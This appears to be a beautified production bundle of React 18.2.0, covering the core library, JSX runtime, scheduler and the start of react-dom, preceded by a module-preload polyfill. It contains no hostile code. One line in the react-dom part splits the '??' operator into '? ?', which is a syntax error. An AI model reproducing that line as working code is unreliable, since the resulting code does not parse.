function Lp(e, t) {
    for (var n = 0; n < t.length; n++) {
        const r = t[n];
        if (typeof r != "string" && !Array.isArray(r)) {
            for (const i in r)
                if (i !== "default" && !(i in e)) {
                    const a = Object.getOwnPropertyDescriptor(r, i);
                    a && Object.defineProperty(e, i, a.get ? a : {
                        enumerable: !0,
                        get: () => r[i]
                    })
                }
        }
    }
    return Object.freeze(Object.defineProperty(e, Symbol.toStringTag, {
        value: "Module"
    }))
}(function() {
    const t = document.createElement("link").relList;
    if (t && t.supports && t.supports("modulepreload")) return;
    for (const i of document.querySelectorAll('link[rel="modulepreload"]')) r(i);
    new MutationObserver(i => {
        for (const a of i)
            if (a.type === "childList")
                for (const l of a.addedNodes) l.tagName === "LINK" && l.rel === "modulepreload" && r(l)
    }).observe(document, {
        childList: !0,
        subtree: !0
    });

    function n(i) {
        const a = {};
        return i.integrity && (a.integrity = i.integrity), i.referrerPolicy && (a.referrerPolicy = i.referrerPolicy), i.crossOrigin === "use-credentials" ? a.credentials = "include" : i.crossOrigin === "anonymous" ? a.credentials = "omit" : a.credentials = "same-origin", a
    }

    function r(i) {
        if (i.ep) return;
        i.ep = !0;
        const a = n(i);
        fetch(i.href, a)
    }
})();

function Pc(e) {
    return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e.default : e
}
var jc = {
        exports: {}
    },
    oa = {},
    Ac = {
        exports: {}
    },
    M = {};
/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var Mr = Symbol.for("react.element"),
    Rp = Symbol.for("react.portal"),
    Mp = Symbol.for("react.fragment"),
    Dp = Symbol.for("react.strict_mode"),
    Fp = Symbol.for("react.profiler"),
    _p = Symbol.for("react.provider"),
    Up = Symbol.for("react.context"),
    Bp = Symbol.for("react.forward_ref"),
    Hp = Symbol.for("react.suspense"),
    Vp = Symbol.for("react.memo"),
    Wp = Symbol.for("react.lazy"),
    Ls = Symbol.iterator;

function Qp(e) {
    return e === null || typeof e != "object" ? null : (e = Ls && e[Ls] || e["@@iterator"], typeof e == "function" ? e : null)
}
var Ic = {
        isMounted: function() {
            return !1
        },
        enqueueForceUpdate: function() {},
        enqueueReplaceState: function() {},
        enqueueSetState: function() {}
    },
    Oc = Object.assign,
    bc = {};

function Dn(e, t, n) {
    this.props = e, this.context = t, this.refs = bc, this.updater = n || Ic
}
Dn.prototype.isReactComponent = {};
Dn.prototype.setState = function(e, t) {
    if (typeof e != "object" && typeof e != "function" && e != null) throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");
    this.updater.enqueueSetState(this, e, t, "setState")
};
Dn.prototype.forceUpdate = function(e) {
    this.updater.enqueueForceUpdate(this, e, "forceUpdate")
};

function Tc() {}
Tc.prototype = Dn.prototype;

function Eo(e, t, n) {
    this.props = e, this.context = t, this.refs = bc, this.updater = n || Ic
}
var Co = Eo.prototype = new Tc;
Co.constructor = Eo;
Oc(Co, Dn.prototype);
Co.isPureReactComponent = !0;
var Rs = Array.isArray,
    zc = Object.prototype.hasOwnProperty,
    No = {
        current: null
    },
    Lc = {
        key: !0,
        ref: !0,
        __self: !0,
        __source: !0
    };

function Rc(e, t, n) {
    var r, i = {},
        a = null,
        l = null;
    if (t != null)
        for (r in t.ref !== void 0 && (l = t.ref), t.key !== void 0 && (a = "" + t.key), t) zc.call(t, r) && !Lc.hasOwnProperty(r) && (i[r] = t[r]);
    var o = arguments.length - 2;
    if (o === 1) i.children = n;
    else if (1 < o) {
        for (var s = Array(o), u = 0; u < o; u++) s[u] = arguments[u + 2];
        i.children = s
    }
    if (e && e.defaultProps)
        for (r in o = e.defaultProps, o) i[r] === void 0 && (i[r] = o[r]);
    return {
        $$typeof: Mr,
        type: e,
        key: a,
        ref: l,
        props: i,
        _owner: No.current
    }
}

function Yp(e, t) {
    return {
        $$typeof: Mr,
        type: e.type,
        key: t,
        ref: e.ref,
        props: e.props,
        _owner: e._owner
    }
}

function Po(e) {
    return typeof e == "object" && e !== null && e.$$typeof === Mr
}

function Kp(e) {
    var t = {
        "=": "=0",
        ":": "=2"
    };
    return "$" + e.replace(/[=:]/g, function(n) {
        return t[n]
    })
}
var Ms = /\/+/g;

function La(e, t) {
    return typeof e == "object" && e !== null && e.key != null ? Kp("" + e.key) : t.toString(36)
}

function yi(e, t, n, r, i) {
    var a = typeof e;
    (a === "undefined" || a === "boolean") && (e = null);
    var l = !1;
    if (e === null) l = !0;
    else switch (a) {
        case "string":
        case "number":
            l = !0;
            break;
        case "object":
            switch (e.$$typeof) {
                case Mr:
                case Rp:
                    l = !0
            }
    }
    if (l) return l = e, i = i(l), e = r === "" ? "." + La(l, 0) : r, Rs(i) ? (n = "", e != null && (n = e.replace(Ms, "$&/") + "/"), yi(i, t, n, "", function(u) {
        return u
    })) : i != null && (Po(i) && (i = Yp(i, n + (!i.key || l && l.key === i.key ? "" : ("" + i.key).replace(Ms, "$&/") + "/") + e)), t.push(i)), 1;
    if (l = 0, r = r === "" ? "." : r + ":", Rs(e))
        for (var o = 0; o < e.length; o++) {
            a = e[o];
            var s = r + La(a, o);
            l += yi(a, t, n, s, i)
        } else if (s = Qp(e), typeof s == "function")
            for (e = s.call(e), o = 0; !(a = e.next()).done;) a = a.value, s = r + La(a, o++), l += yi(a, t, n, s, i);
        else if (a === "object") throw t = String(e), Error("Objects are not valid as a React child (found: " + (t === "[object Object]" ? "object with keys {" + Object.keys(e).join(", ") + "}" : t) + "). If you meant to render a collection of children, use an array instead.");
    return l
}

function Yr(e, t, n) {
    if (e == null) return e;
    var r = [],
        i = 0;
    return yi(e, r, "", "", function(a) {
        return t.call(n, a, i++)
    }), r
}

function Gp(e) {
    if (e._status === -1) {
        var t = e._result;
        t = t(), t.then(function(n) {
            (e._status === 0 || e._status === -1) && (e._status = 1, e._result = n)
        }, function(n) {
            (e._status === 0 || e._status === -1) && (e._status = 2, e._result = n)
        }), e._status === -1 && (e._status = 0, e._result = t)
    }
    if (e._status === 1) return e._result.default;
    throw e._result
}
var ve = {
        current: null
    },
    wi = {
        transition: null
    },
    Zp = {
        ReactCurrentDispatcher: ve,
        ReactCurrentBatchConfig: wi,
        ReactCurrentOwner: No
    };
M.Children = {
    map: Yr,
    forEach: function(e, t, n) {
        Yr(e, function() {
            t.apply(this, arguments)
        }, n)
    },
    count: function(e) {
        var t = 0;
        return Yr(e, function() {
            t++
        }), t
    },
    toArray: function(e) {
        return Yr(e, function(t) {
            return t
        }) || []
    },
    only: function(e) {
        if (!Po(e)) throw Error("React.Children.only expected to receive a single React element child.");
        return e
    }
};
M.Component = Dn;
M.Fragment = Mp;
M.Profiler = Fp;
M.PureComponent = Eo;
M.StrictMode = Dp;
M.Suspense = Hp;
M.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = Zp;
M.cloneElement = function(e, t, n) {
    if (e == null) throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + e + ".");
    var r = Oc({}, e.props),
        i = e.key,
        a = e.ref,
        l = e._owner;
    if (t != null) {
        if (t.ref !== void 0 && (a = t.ref, l = No.current), t.key !== void 0 && (i = "" + t.key), e.type && e.type.defaultProps) var o = e.type.defaultProps;
        for (s in t) zc.call(t, s) && !Lc.hasOwnProperty(s) && (r[s] = t[s] === void 0 && o !== void 0 ? o[s] : t[s])
    }
    var s = arguments.length - 2;
    if (s === 1) r.children = n;
    else if (1 < s) {
        o = Array(s);
        for (var u = 0; u < s; u++) o[u] = arguments[u + 2];
        r.children = o
    }
    return {
        $$typeof: Mr,
        type: e.type,
        key: i,
        ref: a,
        props: r,
        _owner: l
    }
};
M.createContext = function(e) {
    return e = {
        $$typeof: Up,
        _currentValue: e,
        _currentValue2: e,
        _threadCount: 0,
        Provider: null,
        Consumer: null,
        _defaultValue: null,
        _globalName: null
    }, e.Provider = {
        $$typeof: _p,
        _context: e
    }, e.Consumer = e
};
M.createElement = Rc;
M.createFactory = function(e) {
    var t = Rc.bind(null, e);
    return t.type = e, t
};
M.createRef = function() {
    return {
        current: null
    }
};
M.forwardRef = function(e) {
    return {
        $$typeof: Bp,
        render: e
    }
};
M.isValidElement = Po;
M.lazy = function(e) {
    return {
        $$typeof: Wp,
        _payload: {
            _status: -1,
            _result: e
        },
        _init: Gp
    }
};
M.memo = function(e, t) {
    return {
        $$typeof: Vp,
        type: e,
        compare: t === void 0 ? null : t
    }
};
M.startTransition = function(e) {
    var t = wi.transition;
    wi.transition = {};
    try {
        e()
    } finally {
        wi.transition = t
    }
};
M.unstable_act = function() {
    throw Error("act(...) is not supported in production builds of React.")
};
M.useCallback = function(e, t) {
    return ve.current.useCallback(e, t)
};
M.useContext = function(e) {
    return ve.current.useContext(e)
};
M.useDebugValue = function() {};
M.useDeferredValue = function(e) {
    return ve.current.useDeferredValue(e)
};
M.useEffect = function(e, t) {
    return ve.current.useEffect(e, t)
};
M.useId = function() {
    return ve.current.useId()
};
M.useImperativeHandle = function(e, t, n) {
    return ve.current.useImperativeHandle(e, t, n)
};
M.useInsertionEffect = function(e, t) {
    return ve.current.useInsertionEffect(e, t)
};
M.useLayoutEffect = function(e, t) {
    return ve.current.useLayoutEffect(e, t)
};
M.useMemo = function(e, t) {
    return ve.current.useMemo(e, t)
};
M.useReducer = function(e, t, n) {
    return ve.current.useReducer(e, t, n)
};
M.useRef = function(e) {
    return ve.current.useRef(e)
};
M.useState = function(e) {
    return ve.current.useState(e)
};
M.useSyncExternalStore = function(e, t, n) {
    return ve.current.useSyncExternalStore(e, t, n)
};
M.useTransition = function() {
    return ve.current.useTransition()
};
M.version = "18.2.0";
Ac.exports = M;
var b = Ac.exports;
const sa = Pc(b),
    Xp = Lp({
        __proto__: null,
        default: sa
    }, [b]);
/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var Jp = b,
    qp = Symbol.for("react.element"),
    $p = Symbol.for("react.fragment"),
    em = Object.prototype.hasOwnProperty,
    tm = Jp.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,
    nm = {
        key: !0,
        ref: !0,
        __self: !0,
        __source: !0
    };

function Mc(e, t, n) {
    var r, i = {},
        a = null,
        l = null;
    n !== void 0 && (a = "" + n), t.key !== void 0 && (a = "" + t.key), t.ref !== void 0 && (l = t.ref);
    for (r in t) em.call(t, r) && !nm.hasOwnProperty(r) && (i[r] = t[r]);
    if (e && e.defaultProps)
        for (r in t = e.defaultProps, t) i[r] === void 0 && (i[r] = t[r]);
    return {
        $$typeof: qp,
        type: e,
        key: a,
        ref: l,
        props: i,
        _owner: tm.current
    }
}
oa.Fragment = $p;
oa.jsx = Mc;
oa.jsxs = Mc;
jc.exports = oa;
var d = jc.exports,
    fl = {},
    Dc = {
        exports: {}
    },
    Ae = {},
    Fc = {
        exports: {}
    },
    _c = {};
/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
(function(e) {
    function t(A, T) {
        var z = A.length;
        A.push(T);
        e: for (; 0 < z;) {
            var J = z - 1 >>> 1,
                re = A[J];
            if (0 < i(re, T)) A[J] = T, A[z] = re, z = J;
            else break e
        }
    }

    function n(A) {
        return A.length === 0 ? null : A[0]
    }

    function r(A) {
        if (A.length === 0) return null;
        var T = A[0],
            z = A.pop();
        if (z !== T) {
            A[0] = z;
            e: for (var J = 0, re = A.length, Wr = re >>> 1; J < Wr;) {
                var Ft = 2 * (J + 1) - 1,
                    za = A[Ft],
                    _t = Ft + 1,
                    Qr = A[_t];
                if (0 > i(za, z)) _t < re && 0 > i(Qr, za) ? (A[J] = Qr, A[_t] = z, J = _t) : (A[J] = za, A[Ft] = z, J = Ft);
                else if (_t < re && 0 > i(Qr, z)) A[J] = Qr, A[_t] = z, J = _t;
                else break e
            }
        }
        return T
    }

    function i(A, T) {
        var z = A.sortIndex - T.sortIndex;
        return z !== 0 ? z : A.id - T.id
    }
    if (typeof performance == "object" && typeof performance.now == "function") {
        var a = performance;
        e.unstable_now = function() {
            return a.now()
        }
    } else {
        var l = Date,
            o = l.now();
        e.unstable_now = function() {
            return l.now() - o
        }
    }
    var s = [],
        u = [],
        f = 1,
        m = null,
        v = 3,
        g = !1,
        w = !1,
        k = !1,
        E = typeof setTimeout == "function" ? setTimeout : null,
        p = typeof clearTimeout == "function" ? clearTimeout : null,
        c = typeof setImmediate < "u" ? setImmediate : null;
    typeof navigator < "u" && navigator.scheduling !== void 0 && navigator.scheduling.isInputPending !== void 0 && navigator.scheduling.isInputPending.bind(navigator.scheduling);

    function h(A) {
        for (var T = n(u); T !== null;) {
            if (T.callback === null) r(u);
            else if (T.startTime <= A) r(u), T.sortIndex = T.expirationTime, t(s, T);
            else break;
            T = n(u)
        }
    }

    function y(A) {
        if (k = !1, h(A), !w)
            if (n(s) !== null) w = !0, ba(S);
            else {
                var T = n(u);
                T !== null && Ta(y, T.startTime - A)
            }
    }

    function S(A, T) {
        w = !1, k && (k = !1, p(O), O = -1), g = !0;
        var z = v;
        try {
            for (h(T), m = n(s); m !== null && (!(m.expirationTime > T) || A && !De());) {
                var J = m.callback;
                if (typeof J == "function") {
                    m.callback = null, v = m.priorityLevel;
                    var re = J(m.expirationTime <= T);
                    T = e.unstable_now(), typeof re == "function" ? m.callback = re : m === n(s) && r(s), h(T)
                } else r(s);
                m = n(s)
            }
            if (m !== null) var Wr = !0;
            else {
                var Ft = n(u);
                Ft !== null && Ta(y, Ft.startTime - T), Wr = !1
            }
            return Wr
        } finally {
            m = null, v = z, g = !1
        }
    }
    var P = !1,
        j = null,
        O = -1,
        F = 5,
        L = -1;

    function De() {
        return !(e.unstable_now() - L < F)
    }

    function Bn() {
        if (j !== null) {
            var A = e.unstable_now();
            L = A;
            var T = !0;
            try {
                T = j(!0, A)
            } finally {
                T ? Hn() : (P = !1, j = null)
            }
        } else P = !1
    }
    var Hn;
    if (typeof c == "function") Hn = function() {
        c(Bn)
    };
    else if (typeof MessageChannel < "u") {
        var zs = new MessageChannel,
            zp = zs.port2;
        zs.port1.onmessage = Bn, Hn = function() {
            zp.postMessage(null)
        }
    } else Hn = function() {
        E(Bn, 0)
    };

    function ba(A) {
        j = A, P || (P = !0, Hn())
    }

    function Ta(A, T) {
        O = E(function() {
            A(e.unstable_now())
        }, T)
    }
    e.unstable_IdlePriority = 5, e.unstable_ImmediatePriority = 1, e.unstable_LowPriority = 4, e.unstable_NormalPriority = 3, e.unstable_Profiling = null, e.unstable_UserBlockingPriority = 2, e.unstable_cancelCallback = function(A) {
        A.callback = null
    }, e.unstable_continueExecution = function() {
        w || g || (w = !0, ba(S))
    }, e.unstable_forceFrameRate = function(A) {
        0 > A || 125 < A ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : F = 0 < A ? Math.floor(1e3 / A) : 5
    }, e.unstable_getCurrentPriorityLevel = function() {
        return v
    }, e.unstable_getFirstCallbackNode = function() {
        return n(s)
    }, e.unstable_next = function(A) {
        switch (v) {
            case 1:
            case 2:
            case 3:
                var T = 3;
                break;
            default:
                T = v
        }
        var z = v;
        v = T;
        try {
            return A()
        } finally {
            v = z
        }
    }, e.unstable_pauseExecution = function() {}, e.unstable_requestPaint = function() {}, e.unstable_runWithPriority = function(A, T) {
        switch (A) {
            case 1:
            case 2:
            case 3:
            case 4:
            case 5:
                break;
            default:
                A = 3
        }
        var z = v;
        v = A;
        try {
            return T()
        } finally {
            v = z
        }
    }, e.unstable_scheduleCallback = function(A, T, z) {
        var J = e.unstable_now();
        switch (typeof z == "object" && z !== null ? (z = z.delay, z = typeof z == "number" && 0 < z ? J + z : J) : z = J, A) {
            case 1:
                var re = -1;
                break;
            case 2:
                re = 250;
                break;
            case 5:
                re = 1073741823;
                break;
            case 4:
                re = 1e4;
                break;
            default:
                re = 5e3
        }
        return re = z + re, A = {
            id: f++,
            callback: T,
            priorityLevel: A,
            startTime: z,
            expirationTime: re,
            sortIndex: -1
        }, z > J ? (A.sortIndex = z, t(u, A), n(s) === null && A === n(u) && (k ? (p(O), O = -1) : k = !0, Ta(y, z - J))) : (A.sortIndex = re, t(s, A), w || g || (w = !0, ba(S))), A
    }, e.unstable_shouldYield = De, e.unstable_wrapCallback = function(A) {
        var T = v;
        return function() {
            var z = v;
            v = T;
            try {
                return A.apply(this, arguments)
            } finally {
                v = z
            }
        }
    }
})(_c);
Fc.exports = _c;
var rm = Fc.exports;
/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var Uc = b,
    je = rm;

function x(e) {
    for (var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1; n < arguments.length; n++) t += "&args[]=" + encodeURIComponent(arguments[n]);
    return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
}
var Bc = new Set,
    pr = {};

function nn(e, t) {
    In(e, t), In(e + "Capture", t)
}

function In(e, t) {
    for (pr[e] = t, e = 0; e < t.length; e++) Bc.add(t[e])
}
var it = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u"),
    dl = Object.prototype.hasOwnProperty,
    im = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
    Ds = {},
    Fs = {};

function am(e) {
    return dl.call(Fs, e) ? !0 : dl.call(Ds, e) ? !1 : im.test(e) ? Fs[e] = !0 : (Ds[e] = !0, !1)
}

function lm(e, t, n, r) {
    if (n !== null && n.type === 0) return !1;
    switch (typeof t) {
        case "function":
        case "symbol":
            return !0;
        case "boolean":
            return r ? !1 : n !== null ? !n.acceptsBooleans : (e = e.toLowerCase().slice(0, 5), e !== "data-" && e !== "aria-");
        default:
            return !1
    }
}

function om(e, t, n, r) {
    if (t === null || typeof t > "u" || lm(e, t, n, r)) return !0;
    if (r) return !1;
    if (n !== null) switch (n.type) {
        case 3:
            return !t;
        case 4:
            return t === !1;
        case 5:
            return isNaN(t);
        case 6:
            return isNaN(t) || 1 > t
    }
    return !1
}

function ge(e, t, n, r, i, a, l) {
    this.acceptsBooleans = t === 2 || t === 3 || t === 4, this.attributeName = r, this.attributeNamespace = i, this.mustUseProperty = n, this.propertyName = e, this.type = t, this.sanitizeURL = a, this.removeEmptyString = l
}
var ue = {};
"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e) {
    ue[e] = new ge(e, 0, !1, e, null, !1, !1)
});
[
    ["acceptCharset", "accept-charset"],
    ["className", "class"],
    ["htmlFor", "for"],
    ["httpEquiv", "http-equiv"]
].forEach(function(e) {
    var t = e[0];
    ue[t] = new ge(t, 1, !1, e[1], null, !1, !1)
});
["contentEditable", "draggable", "spellCheck", "value"].forEach(function(e) {
    ue[e] = new ge(e, 2, !1, e.toLowerCase(), null, !1, !1)
});
["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function(e) {
    ue[e] = new ge(e, 2, !1, e, null, !1, !1)
});
"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e) {
    ue[e] = new ge(e, 3, !1, e.toLowerCase(), null, !1, !1)
});
["checked", "multiple", "muted", "selected"].forEach(function(e) {
    ue[e] = new ge(e, 3, !0, e, null, !1, !1)
});
["capture", "download"].forEach(function(e) {
    ue[e] = new ge(e, 4, !1, e, null, !1, !1)
});
["cols", "rows", "size", "span"].forEach(function(e) {
    ue[e] = new ge(e, 6, !1, e, null, !1, !1)
});
["rowSpan", "start"].forEach(function(e) {
    ue[e] = new ge(e, 5, !1, e.toLowerCase(), null, !1, !1)
});
var jo = /[\-:]([a-z])/g;

function Ao(e) {
    return e[1].toUpperCase()
}
"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e) {
    var t = e.replace(jo, Ao);
    ue[t] = new ge(t, 1, !1, e, null, !1, !1)
});
"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e) {
    var t = e.replace(jo, Ao);
    ue[t] = new ge(t, 1, !1, e, "http://www.w3.org/1999/xlink", !1, !1)
});
["xml:base", "xml:lang", "xml:space"].forEach(function(e) {
    var t = e.replace(jo, Ao);
    ue[t] = new ge(t, 1, !1, e, "http://www.w3.org/XML/1998/namespace", !1, !1)
});
["tabIndex", "crossOrigin"].forEach(function(e) {
    ue[e] = new ge(e, 1, !1, e.toLowerCase(), null, !1, !1)
});
ue.xlinkHref = new ge("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1);
["src", "href", "action", "formAction"].forEach(function(e) {
    ue[e] = new ge(e, 1, !1, e.toLowerCase(), null, !0, !0)
});

function Io(e, t, n, r) {
    var i = ue.hasOwnProperty(t) ? ue[t] : null;
    (i !== null ? i.type !== 0 : r || !(2 < t.length) || t[0] !== "o" && t[0] !== "O" || t[1] !== "n" && t[1] !== "N") && (om(t, n, i, r) && (n = null), r || i === null ? am(t) && (n === null ? e.removeAttribute(t) : e.setAttribute(t, "" + n)) : i.mustUseProperty ? e[i.propertyName] = n === null ? i.type === 3 ? !1 : "" : n : (t = i.attributeName, r = i.attributeNamespace, n === null ? e.removeAttribute(t) : (i = i.type, n = i === 3 || i === 4 && n === !0 ? "" : "" + n, r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))))
}
var ft = Uc.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,
    Kr = Symbol.for("react.element"),
    ln = Symbol.for("react.portal"),
    on = Symbol.for("react.fragment"),
    Oo = Symbol.for("react.strict_mode"),
    pl = Symbol.for("react.profiler"),
    Hc = Symbol.for("react.provider"),
    Vc = Symbol.for("react.context"),
    bo = Symbol.for("react.forward_ref"),
    ml = Symbol.for("react.suspense"),
    hl = Symbol.for("react.suspense_list"),
    To = Symbol.for("react.memo"),
    ht = Symbol.for("react.lazy"),
    Wc = Symbol.for("react.offscreen"),
    _s = Symbol.iterator;

function Vn(e) {
    return e === null || typeof e != "object" ? null : (e = _s && e[_s] || e["@@iterator"], typeof e == "function" ? e : null)
}
var G = Object.assign,
    Ra;

function Jn(e) {
    if (Ra === void 0) try {
        throw Error()
    } catch (n) {
        var t = n.stack.trim().match(/\n( *(at )?)/);
        Ra = t && t[1] || ""
    }
    return `
` + Ra + e
}
var Ma = !1;

function Da(e, t) {
    if (!e || Ma) return "";
    Ma = !0;
    var n = Error.prepareStackTrace;
    Error.prepareStackTrace = void 0;
    try {
        if (t)
            if (t = function() {
                    throw Error()
                }, Object.defineProperty(t.prototype, "props", {
                    set: function() {
                        throw Error()
                    }
                }), typeof Reflect == "object" && Reflect.construct) {
                try {
                    Reflect.construct(t, [])
                } catch (u) {
                    var r = u
                }
                Reflect.construct(e, [], t)
            } else {
                try {
                    t.call()
                } catch (u) {
                    r = u
                }
                e.call(t.prototype)
            }
        else {
            try {
                throw Error()
            } catch (u) {
                r = u
            }
            e()
        }
    } catch (u) {
        if (u && r && typeof u.stack == "string") {
            for (var i = u.stack.split(`
`), a = r.stack.split(`
`), l = i.length - 1, o = a.length - 1; 1 <= l && 0 <= o && i[l] !== a[o];) o--;
            for (; 1 <= l && 0 <= o; l--, o--)
                if (i[l] !== a[o]) {
                    if (l !== 1 || o !== 1)
                        do
                            if (l--, o--, 0 > o || i[l] !== a[o]) {
                                var s = `
` + i[l].replace(" at new ", " at ");
                                return e.displayName && s.includes("<anonymous>") && (s = s.replace("<anonymous>", e.displayName)), s
                            }
                    while (1 <= l && 0 <= o);
                    break
                }
        }
    } finally {
        Ma = !1, Error.prepareStackTrace = n
    }
    return (e = e ? e.displayName || e.name : "") ? Jn(e) : ""
}

function sm(e) {
    switch (e.tag) {
        case 5:
            return Jn(e.type);
        case 16:
            return Jn("Lazy");
        case 13:
            return Jn("Suspense");
        case 19:
            return Jn("SuspenseList");
        case 0:
        case 2:
        case 15:
            return e = Da(e.type, !1), e;
        case 11:
            return e = Da(e.type.render, !1), e;
        case 1:
            return e = Da(e.type, !0), e;
        default:
            return ""
    }
}

function vl(e) {
    if (e == null) return null;
    if (typeof e == "function") return e.displayName || e.name || null;
    if (typeof e == "string") return e;
    switch (e) {
        case on:
            return "Fragment";
        case ln:
            return "Portal";
        case pl:
            return "Profiler";
        case Oo:
            return "StrictMode";
        case ml:
            return "Suspense";
        case hl:
            return "SuspenseList"
    }
    if (typeof e == "object") switch (e.$$typeof) {
        case Vc:
            return (e.displayName || "Context") + ".Consumer";
        case Hc:
            return (e._context.displayName || "Context") + ".Provider";
        case bo:
            var t = e.render;
            return e = e.displayName, e || (e = t.displayName || t.name || "", e = e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef"), e;
        case To:
            return t = e.displayName || null, t !== null ? t : vl(e.type) || "Memo";
        case ht:
            t = e._payload, e = e._init;
            try {
                return vl(e(t))
            } catch {}
    }
    return null
}

function um(e) {
    var t = e.type;
    switch (e.tag) {
        case 24:
            return "Cache";
        case 9:
            return (t.displayName || "Context") + ".Consumer";
        case 10:
            return (t._context.displayName || "Context") + ".Provider";
        case 18:
            return "DehydratedFragment";
        case 11:
            return e = t.render, e = e.displayName || e.name || "", t.displayName || (e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef");
        case 7:
            return "Fragment";
        case 5:
            return t;
        case 4:
            return "Portal";
        case 3:
            return "Root";
        case 6:
            return "Text";
        case 16:
            return vl(t);
        case 8:
            return t === Oo ? "StrictMode" : "Mode";
        case 22:
            return "Offscreen";
        case 12:
            return "Profiler";
        case 21:
            return "Scope";
        case 13:
            return "Suspense";
        case 19:
            return "SuspenseList";
        case 25:
            return "TracingMarker";
        case 1:
        case 0:
        case 17:
        case 2:
        case 14:
        case 15:
            if (typeof t == "function") return t.displayName || t.name || null;
            if (typeof t == "string") return t
    }
    return null
}

function Ot(e) {
    switch (typeof e) {
        case "boolean":
        case "number":
        case "string":
        case "undefined":
            return e;
        case "object":
            return e;
        default:
            return ""
    }
}

function Qc(e) {
    var t = e.type;
    return (e = e.nodeName) && e.toLowerCase() === "input" && (t === "checkbox" || t === "radio")
}

function cm(e) {
    var t = Qc(e) ? "checked" : "value",
        n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
        r = "" + e[t];
    if (!e.hasOwnProperty(t) && typeof n < "u" && typeof n.get == "function" && typeof n.set == "function") {
        var i = n.get,
            a = n.set;
        return Object.defineProperty(e, t, {
            configurable: !0,
            get: function() {
                return i.call(this)
            },
            set: function(l) {
                r = "" + l, a.call(this, l)
            }
        }), Object.defineProperty(e, t, {
            enumerable: n.enumerable
        }), {
            getValue: function() {
                return r
            },
            setValue: function(l) {
                r = "" + l
            },
            stopTracking: function() {
                e._valueTracker = null, delete e[t]
            }
        }
    }
}

function Gr(e) {
    e._valueTracker || (e._valueTracker = cm(e))
}

function Yc(e) {
    if (!e) return !1;
    var t = e._valueTracker;
    if (!t) return !0;
    var n = t.getValue(),
        r = "";
    return e && (r = Qc(e) ? e.checked ? "true" : "false" : e.value), e = r, e !== n ? (t.setValue(e), !0) : !1
}

function Ti(e) {
    if (e = e || (typeof document < "u" ? document : void 0), typeof e > "u") return null;
    try {
        return e.activeElement || e.body
    } catch {
        return e.body
    }
}

function gl(e, t) {
    var n = t.checked;
    return G({}, t, {
        defaultChecked: void 0,
        defaultValue: void 0,
        value: void 0,
        checked: n ? ? e._wrapperState.initialChecked
    })
}

function Us(e, t) {
    var n = t.defaultValue == null ? "" : t.defaultValue,
        r = t.checked != null ? t.checked : t.defaultChecked;
    n = Ot(t.value != null ? t.value : n), e._wrapperState = {
        initialChecked: r,
        initialValue: n,
        controlled: t.type === "checkbox" || t.type === "radio" ? t.checked != null : t.value != null
    }
}

function Kc(e, t) {
    t = t.checked, t != null && Io(e, "checked", t, !1)
}

function yl(e, t) {
    Kc(e, t);
    var n = Ot(t.value),
        r = t.type;
